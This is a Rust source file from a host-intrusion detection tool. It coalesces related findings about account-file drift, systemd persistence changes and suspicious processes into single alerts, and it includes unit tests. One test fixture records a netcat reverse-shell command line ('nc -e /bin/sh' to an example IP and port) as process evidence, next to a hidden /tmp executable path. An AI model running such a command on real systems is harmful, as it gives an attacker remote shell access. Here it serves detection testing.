use sentinel_core::{Confidence, Evidence, Finding, Severity};
use std::collections::{BTreeMap, BTreeSet};

const ACCOUNT_MERGE_DEDUP_KEYS: &[&str] = &["account_subjects", "identity_files", "signals"];
const ACCOUNT_STATE_FILES: &[&str] = &["/etc/passwd", "/etc/group", "/etc/shadow", "/etc/gshadow"];
const PROCESS_MERGE_DEDUP_KEYS: &[&str] = &["exe_path", "cmdline", "name"];

/// Coalesce findings that describe the same underlying resource or runtime entity.
///
/// Detectors intentionally stay independent, so a systemd unit change can be
/// recognized by both file-integrity and persistence detectors, and one process
/// can have several risk signals. This pass keeps detection modular while
/// preventing users from receiving several messages for one underlying object.
pub(crate) fn coalesce_related_findings(findings: Vec<Finding>) -> Vec<Finding> {
    let mut account_groups = BTreeMap::<String, Vec<Finding>>::new();
    let mut resource_groups = BTreeMap::<String, Vec<Finding>>::new();
    let mut process_groups = BTreeMap::<String, Vec<Finding>>::new();
    let mut retained = Vec::new();

    for finding in findings {
        if is_account_drift(&finding) {
            account_groups
                .entry(account_group_key(&finding))
                .or_default()
                .push(finding);
        } else if is_file_persistence_drift(&finding) {
            resource_groups
                .entry(resource_group_key(&finding))
                .or_default()
                .push(finding);
        } else if is_process_signal(&finding) {
            process_groups
                .entry(process_group_key(&finding))
                .or_default()
                .push(finding);
        } else {
            retained.push(finding);
        }
    }

    retained.extend(account_groups.into_values().map(merge_account_findings));
    retained.extend(resource_groups.into_values().map(merge_resource_findings));
    retained.extend(process_groups.into_values().map(merge_process_findings));
    retained
}

fn is_account_drift(finding: &Finding) -> bool {
    matches!(
        finding.rule_id.as_str(),
        "USER-001" | "USER-002" | "USER-003"
    ) || (finding.rule_id == "FILE-001" && account_file_path(finding).is_some())
}

fn account_file_path(finding: &Finding) -> Option<String> {
    let path = finding
        .evidence
        .iter()
        .find(|item| item.key == "path" && !item.value.trim().is_empty())
        .map(|item| item.value.as_str())
        .unwrap_or(&finding.subject)
        .replace('\\', "/");
    ACCOUNT_STATE_FILES
        .iter()
        .any(|account_file| path == *account_file)
        .then_some(path)
}

fn account_group_key(finding: &Finding) -> String {
    format!("{}\naccount-state", finding.host_id)
}

fn is_file_persistence_drift(finding: &Finding) -> bool {
    matches!(
        finding.rule_id.as_str(),
        "FILE-001" | "PERSIST-001" | "PERSIST-003"
    )
}

fn resource_group_key(finding: &Finding) -> String {
    format!(
        "{}\n{}",
        finding.host_id,
        normalized_resource_subject(finding)
    )
}

fn normalized_resource_subject(finding: &Finding) -> String {
    let path = finding
        .evidence
        .iter()
        .find(|item| item.key == "path" && !item.value.trim().is_empty())
        .map(|item| item.value.as_str())
        .unwrap_or(&finding.subject);
    canonical_systemd_unit_path(path)
}

fn canonical_systemd_unit_path(path: &str) -> String {
    let normalized = path.replace('\\', "/");
    for prefix in ["/lib/systemd/system/", "/usr/lib/systemd/system/"] {
        if let Some(rest) = normalized.strip_prefix(prefix) {
            return format!(
                "/usr/lib/systemd/system/{}",
                canonical_systemd_unit_family(rest)
            );
        }
    }
    normalized
}

fn canonical_systemd_unit_family(unit: &str) -> String {
    unit.strip_suffix("@.service")
        .map(|stem| format!("{stem}.service"))
        .unwrap_or_else(|| unit.to_string())
}

fn process_group_key(finding: &Finding) -> String {
    let pid = finding
        .evidence
        .iter()
        .find(|item| item.key == "pid" && !item.value.trim().is_empty())
        .map(|item| item.value.as_str())
        .unwrap_or(&finding.subject);
    format!("{}\n{}", finding.host_id, pid)
}

fn is_process_signal(finding: &Finding) -> bool {
    matches!(
        finding.rule_id.as_str(),
        "PROC-001" | "PROC-002" | "PROC-003" | "PROC-004" | "PROC-005" | "PROC-006"
    )
}

fn merge_account_findings(mut findings: Vec<Finding>) -> Finding {
    if findings.len() == 1 {
        return findings.remove(0);
    }

    let severity = max_severity(&findings);
    let confidence = max_confidence(&findings);
    findings.sort_by_key(|finding| account_rule_priority(&finding.rule_id));
    let mut primary = findings.remove(0);
    primary.subject = account_group_subject(&primary, &findings);
    let evidence = merge_account_evidence(&primary, &findings);
    primary = primary.with_evidence_deduped_by(evidence, ACCOUNT_MERGE_DEDUP_KEYS);
    primary.severity = severity;
    primary.confidence = confidence;
    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
        &item.impact
    });
    primary.recommendations =
        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
            &item.recommendations
        });
    primary
}

fn merge_resource_findings(mut findings: Vec<Finding>) -> Finding {
    if findings.len() == 1 {
        return findings.remove(0);
    }

    findings.sort_by_key(|finding| rule_priority(&finding.rule_id));
    let mut primary = findings.remove(0);
    let evidence = merge_evidence(&primary, &findings);
    primary =
        primary.with_evidence_deduped_by(evidence, crate::detectors::RESOURCE_DRIFT_DEDUP_KEYS);
    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
        &item.impact
    });
    primary.recommendations =
        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
            &item.recommendations
        });
    primary
}

fn merge_process_findings(mut findings: Vec<Finding>) -> Finding {
    if findings.len() == 1 {
        return findings.remove(0);
    }

    findings.sort_by_key(|finding| process_rule_priority(&finding.rule_id));
    let mut primary = findings.remove(0);
    let evidence = merge_process_evidence(&primary, &findings);
    primary = primary.with_evidence_deduped_by(evidence, PROCESS_MERGE_DEDUP_KEYS);
    primary.impact = merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
        &item.impact
    });
    primary.recommendations =
        merge_text_lists(std::iter::once(&primary).chain(findings.iter()), |item| {
            &item.recommendations
        });
    primary
}

fn account_rule_priority(rule_id: &str) -> u8 {
    match rule_id {
        "USER-002" => 0,
        "USER-003" => 1,
        "USER-001" => 2,
        "FILE-001" => 3,
        _ => 10,
    }
}

fn rule_priority(rule_id: &str) -> u8 {
    match rule_id {
        "PERSIST-003" => 0,
        "PERSIST-001" => 1,
        "FILE-001" => 2,
        _ => 10,
    }
}

fn process_rule_priority(rule_id: &str) -> u8 {
    match rule_id {
        "PROC-003" => 0,
        "PROC-006" => 1,
        "PROC-004" => 2,
        "PROC-002" => 3,
        "PROC-005" => 4,
        "PROC-001" => 5,
        _ => 10,
    }
}

fn merge_account_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
    let mut evidence = vec![
        Evidence::new("account_subjects", account_group_subject(primary, related)),
        Evidence::new("signals", account_signal_names(primary, related).join(", ")),
    ];
    let identity_files = account_file_paths(primary, related);
    if !identity_files.is_empty() {
        evidence.push(Evidence::new("identity_files", identity_files.join(", ")));
    }
    push_joined_evidence(&mut evidence, primary, related, "change");
    for key in [
        "name",
        "uid",
        "previous_uid",
        "gid",
        "home",
        "shell",
        "package_activity_recent",
    ] {
        push_first_evidence(&mut evidence, primary, related, key);
    }
    push_joined_evidence(&mut evidence, primary, related, "package_activity_sources");
    evidence
}

fn merge_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
    let mut path = first_evidence_value(primary, related, "path");
    if path.is_empty() {
        path = primary.subject.clone();
    }

    let mut evidence = vec![
        Evidence::new("path", path),
        Evidence::new("signals", signal_names(primary, related).join(", ")),
    ];
    push_first_evidence(&mut evidence, primary, related, "type");
    push_joined_evidence(&mut evidence, primary, related, "change");
    push_first_evidence(&mut evidence, primary, related, "previous_hash");
    push_first_evidence(&mut evidence, primary, related, "current_hash");
    push_first_evidence(&mut evidence, primary, related, "package_activity_recent");
    push_joined_evidence(&mut evidence, primary, related, "package_activity_sources");
    evidence
}

fn merge_process_evidence(primary: &Finding, related: &[Finding]) -> Vec<Evidence> {
    let mut evidence = Vec::new();
    for key in [
        "pid",
        "ppid",
        "name",
        "parent_name",
        "exe_path",
        "cmdline",
        "cwd",
        "euid",
        "exe_uid",
        "exe_gid",
        "exe_size",
        "exe_hash_blake3",
        "package_owner",
        "systemd_unit",
        "systemd_execstart",
        "container_context",
        "socket_fd_count",
        "cpu_percent",
        "cpu_total_seconds",
        "process_age_seconds",
        "outbound_connection_count",
        "public_outbound_count",
        "outbound_remote_ports",
        "mining_pool_remote_ports",
        "gpu_memory_mb",
        "gpu_process_names",
        "gpu_uuids",
        "package_activity_recent",
    ] {
        push_first_evidence(&mut evidence, primary, related, key);
    }
    evidence.push(Evidence::new(
        "signals",
        process_signal_names(primary, related).join(", "),
    ));
    if let Some(score) = max_numeric_evidence(primary, related, "risk_score") {
        evidence.push(Evidence::new("risk_score", score.to_string()));
    }
    push_joined_evidence(&mut evidence, primary, related, "risk_reasons");
    push_joined_evidence(&mut evidence, primary, related, "risk_features");
    evidence
}

fn account_group_subject(primary: &Finding, related: &[Finding]) -> String {
    let subjects = account_subjects(primary, related);
    if subjects.is_empty() {
        "identity database".to_string()
    } else {
        subjects.join(", ")
    }
}

fn account_subjects(primary: &Finding, related: &[Finding]) -> Vec<String> {
    let mut subjects = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        if matches!(
            finding.rule_id.as_str(),
            "USER-001" | "USER-002" | "USER-003"
        ) {
            if !finding.subject.trim().is_empty() {
                subjects.insert(finding.subject.clone());
            }
            for item in &finding.evidence {
                if item.key == "name" && !item.value.trim().is_empty() {
                    subjects.insert(item.value.clone());
                }
            }
        }
    }
    subjects.into_iter().collect()
}

fn account_file_paths(primary: &Finding, related: &[Finding]) -> Vec<String> {
    let mut paths = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        if let Some(path) = account_file_path(finding) {
            paths.insert(path);
        }
    }
    paths.into_iter().collect()
}

fn account_signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
    let mut signals = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        match finding.rule_id.as_str() {
            "FILE-001" => {
                signals.insert("account file drift");
            }
            "USER-001" => {
                signals.insert("local user account");
            }
            "USER-002" | "USER-003" => {
                signals.insert("privilege account change");
            }
            _ => {}
        }
    }
    signals.into_iter().collect()
}

fn signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
    let mut signals = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        match finding.rule_id.as_str() {
            "FILE-001" => {
                signals.insert("file integrity");
            }
            "PERSIST-001" | "PERSIST-003" => {
                signals.insert("persistence");
            }
            _ => {}
        }
    }
    signals.into_iter().collect()
}

fn process_signal_names(primary: &Finding, related: &[Finding]) -> Vec<&'static str> {
    let mut signals = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        match finding.rule_id.as_str() {
            "PROC-001" => {
                signals.insert("suspicious executable path");
            }
            "PROC-002" => {
                signals.insert("deleted executable");
            }
            "PROC-003" => {
                signals.insert("network execution bridge");
            }
            "PROC-004" => {
                signals.insert("miner or scanner indicator");
            }
            "PROC-005" => {
                signals.insert("behavior cluster");
            }
            "PROC-006" => {
                signals.insert("gpu mining indicator");
            }
            _ => {}
        }
    }
    signals.into_iter().collect()
}

fn max_severity(findings: &[Finding]) -> Severity {
    findings
        .iter()
        .map(|finding| finding.severity)
        .max()
        .unwrap_or(Severity::Info)
}

fn max_confidence(findings: &[Finding]) -> Confidence {
    findings
        .iter()
        .map(|finding| finding.confidence)
        .max_by_key(|confidence| confidence_rank(*confidence))
        .unwrap_or(Confidence::Low)
}

fn confidence_rank(confidence: Confidence) -> u8 {
    match confidence {
        Confidence::Low => 0,
        Confidence::Medium => 1,
        Confidence::High => 2,
    }
}

fn first_evidence_value(primary: &Finding, related: &[Finding], key: &str) -> String {
    std::iter::once(primary)
        .chain(related.iter())
        .flat_map(|finding| finding.evidence.iter())
        .find(|item| item.key == key && !item.value.trim().is_empty())
        .map(|item| item.value.clone())
        .unwrap_or_default()
}

fn push_first_evidence(
    evidence: &mut Vec<Evidence>,
    primary: &Finding,
    related: &[Finding],
    key: &str,
) {
    let value = first_evidence_value(primary, related, key);
    if !value.is_empty() {
        evidence.push(Evidence::new(key, value));
    }
}

fn push_joined_evidence(
    evidence: &mut Vec<Evidence>,
    primary: &Finding,
    related: &[Finding],
    key: &str,
) {
    let values = unique_evidence_values(primary, related, key);
    if !values.is_empty() {
        evidence.push(Evidence::new(key, values.join(", ")));
    }
}

fn unique_evidence_values(primary: &Finding, related: &[Finding], key: &str) -> Vec<String> {
    let mut values = BTreeSet::new();
    for finding in std::iter::once(primary).chain(related.iter()) {
        for item in &finding.evidence {
            if item.key == key && !item.value.trim().is_empty() {
                values.insert(item.value.clone());
            }
        }
    }
    values.into_iter().collect()
}

fn max_numeric_evidence(primary: &Finding, related: &[Finding], key: &str) -> Option<u16> {
    std::iter::once(primary)
        .chain(related.iter())
        .flat_map(|finding| finding.evidence.iter())
        .filter(|item| item.key == key)
        .filter_map(|item| item.value.parse::<u16>().ok())
        .max()
}

fn merge_text_lists<'a>(
    findings: impl Iterator<Item = &'a Finding>,
    select: impl Fn(&'a Finding) -> &'a Vec<String>,
) -> Vec<String> {
    let mut seen = BTreeSet::new();
    let mut merged = Vec::new();
    for finding in findings {
        for item in select(finding) {
            if seen.insert(item.clone()) {
                merged.push(item.clone());
            }
        }
    }
    merged
}

#[cfg(test)]
mod tests {
    use super::coalesce_related_findings;
    use sentinel_core::{Category, Evidence, Finding, Severity};

    #[test]
    fn coalesces_file_and_persistence_findings_for_same_path() {
        let findings = coalesce_related_findings(vec![
            finding("FILE-001", Category::FileIntegrity),
            finding("PERSIST-001", Category::Persistence),
        ]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PERSIST-001");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "signals" && item.value == "file integrity, persistence"));
    }

    #[test]
    fn coalesced_drift_keeps_package_activity_context() {
        let mut file = finding("FILE-001", Category::FileIntegrity);
        file.evidence
            .push(Evidence::new("package_activity_recent", "true"));
        file.evidence.push(Evidence::new(
            "package_activity_sources",
            "/var/log/dpkg.log",
        ));
        let findings =
            coalesce_related_findings(vec![file, finding("PERSIST-001", Category::Persistence)]);

        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "package_activity_recent" && item.value == "true"));
    }

    #[test]
    fn coalesces_process_findings_for_same_pid() {
        let findings = coalesce_related_findings(vec![
            process_finding("PROC-001", Severity::High, "/tmp/.x/sh"),
            process_finding("PROC-003", Severity::Critical, "42").with_evidence(vec![
                Evidence::new("pid", "42"),
                Evidence::new("ppid", "1"),
                Evidence::new("name", "sh"),
                Evidence::new("parent_name", "systemd"),
                Evidence::new("exe_path", "/tmp/.x/sh"),
                Evidence::new("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
                Evidence::new("systemd_unit", "x.service"),
                Evidence::new("exe_hash_blake3", "abc123"),
                Evidence::new("public_outbound_count", "1"),
                Evidence::new("risk_score", "120"),
                Evidence::new("risk_reasons", "network execution bridge"),
                Evidence::new("risk_features", "fd_bridge"),
            ]),
        ]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PROC-003");
        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
            && item.value.contains("network execution bridge")
            && item.value.contains("suspicious executable path")));
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "risk_score" && item.value == "120"));
        for key in [
            "parent_name",
            "systemd_unit",
            "exe_hash_blake3",
            "public_outbound_count",
        ] {
            assert!(
                findings[0].evidence.iter().any(|item| item.key == key),
                "missing merged evidence key {key}"
            );
        }
    }

    #[test]
    fn coalesces_process_findings_by_pid_evidence_when_subjects_differ() {
        let findings = coalesce_related_findings(vec![
            process_finding("PROC-001", Severity::High, "/tmp/.x/sh"),
            process_finding("PROC-005", Severity::High, "42"),
        ]);

        assert_eq!(findings.len(), 1);
        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
            && item.value.contains("suspicious executable path")
            && item.value.contains("behavior cluster")));
    }

    #[test]
    fn coalesces_account_file_drift_with_user_change() {
        let findings = coalesce_related_findings(vec![
            account_file_finding("/etc/passwd"),
            account_file_finding("/etc/shadow"),
            user_finding("USER-001", Severity::Medium, "sing-box"),
        ]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "USER-001");
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(findings[0].subject, "sing-box");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "identity_files"
                && item.value.contains("/etc/passwd")
                && item.value.contains("/etc/shadow")));
        assert!(findings[0].evidence.iter().any(|item| item.key == "signals"
            && item.value.contains("account file drift")
            && item.value.contains("local user account")));
    }

    #[test]
    fn coalesces_account_file_drift_without_user_change() {
        let findings = coalesce_related_findings(vec![
            account_file_finding("/etc/passwd"),
            account_file_finding("/etc/group"),
            account_file_finding("/etc/shadow"),
        ]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "FILE-001");
        assert_eq!(findings[0].subject, "identity database");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "identity_files"
                && item.value.contains("/etc/passwd")
                && item.value.contains("/etc/group")
                && item.value.contains("/etc/shadow")));
    }

    #[test]
    fn keeps_unrelated_file_findings_separate() {
        let mut other = finding("PERSIST-001", Category::Persistence);
        other.subject = "/etc/systemd/system/other.service".to_string();
        other.evidence = vec![
            Evidence::new("path", "/etc/systemd/system/other.service"),
            Evidence::new("change", "file_created"),
            Evidence::new("previous_hash", ""),
            Evidence::new("current_hash", "abc"),
        ];
        let findings =
            coalesce_related_findings(vec![finding("FILE-001", Category::FileIntegrity), other]);
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn coalesces_equivalent_systemd_unit_paths() {
        let mut lib = finding("FILE-001", Category::FileIntegrity);
        lib.subject = "/lib/systemd/system/sing-box.service".to_string();
        lib.evidence = vec![
            Evidence::new("path", "/lib/systemd/system/sing-box.service"),
            Evidence::new("change", "file_modified"),
            Evidence::new("current_hash", "abc"),
        ];
        let mut usr = finding("PERSIST-001", Category::Persistence);
        usr.subject = "/usr/lib/systemd/system/sing-box.service".to_string();
        usr.evidence = vec![
            Evidence::new("path", "/usr/lib/systemd/system/sing-box.service"),
            Evidence::new("change", "persistence_modified"),
            Evidence::new("current_hash", "abc"),
        ];

        let findings = coalesce_related_findings(vec![lib, usr]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PERSIST-001");
    }

    #[test]
    fn coalesces_regular_and_template_systemd_units_for_same_service_family() {
        let mut service = finding("PERSIST-001", Category::Persistence);
        service.subject = "/usr/lib/systemd/system/sing-box.service".to_string();
        service.evidence = vec![
            Evidence::new("path", "/usr/lib/systemd/system/sing-box.service"),
            Evidence::new("change", "persistence_created"),
            Evidence::new("current_hash", "abc"),
        ];
        let mut template = finding("PERSIST-001", Category::Persistence);
        template.subject = "/usr/lib/systemd/system/sing-box@.service".to_string();
        template.evidence = vec![
            Evidence::new("path", "/usr/lib/systemd/system/sing-box@.service"),
            Evidence::new("change", "persistence_created"),
            Evidence::new("current_hash", "def"),
        ];

        let findings = coalesce_related_findings(vec![service, template]);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PERSIST-001");
    }

    fn finding(rule_id: &str, category: Category) -> Finding {
        Finding::new(
            "host",
            "changed",
            "changed",
            Severity::High,
            category,
            rule_id,
            "/etc/systemd/system/vps-sentinel.service",
        )
        .with_evidence(vec![
            Evidence::new("path", "/etc/systemd/system/vps-sentinel.service"),
            Evidence::new("change", "file_created"),
            Evidence::new("previous_hash", ""),
            Evidence::new("current_hash", "abc"),
        ])
    }

    fn account_file_finding(path: &str) -> Finding {
        Finding::new(
            "host",
            "account file changed",
            "account file changed",
            Severity::High,
            Category::FileIntegrity,
            "FILE-001",
            path,
        )
        .with_evidence(vec![
            Evidence::new("path", path),
            Evidence::new("change", "file_modified"),
            Evidence::new("previous_hash", "old"),
            Evidence::new("current_hash", "new"),
        ])
    }

    fn user_finding(rule_id: &str, severity: Severity, user: &str) -> Finding {
        Finding::new(
            "host",
            "user changed",
            "user changed",
            severity,
            Category::User,
            rule_id,
            user,
        )
        .with_evidence(vec![
            Evidence::new("change", "user_created"),
            Evidence::new("name", user),
            Evidence::new("uid", "997"),
            Evidence::new("gid", "997"),
            Evidence::new("home", "/"),
            Evidence::new("shell", "/usr/sbin/nologin"),
        ])
    }

    fn process_finding(rule_id: &str, severity: Severity, subject: &str) -> Finding {
        Finding::new(
            "host",
            "process",
            "process",
            severity,
            Category::Process,
            rule_id,
            subject,
        )
        .with_evidence(vec![
            Evidence::new("pid", "42"),
            Evidence::new("ppid", "1"),
            Evidence::new("name", "sh"),
            Evidence::new("exe_path", "/tmp/.x/sh"),
            Evidence::new("cmdline", "/tmp/.x/sh"),
        ])
    }
}
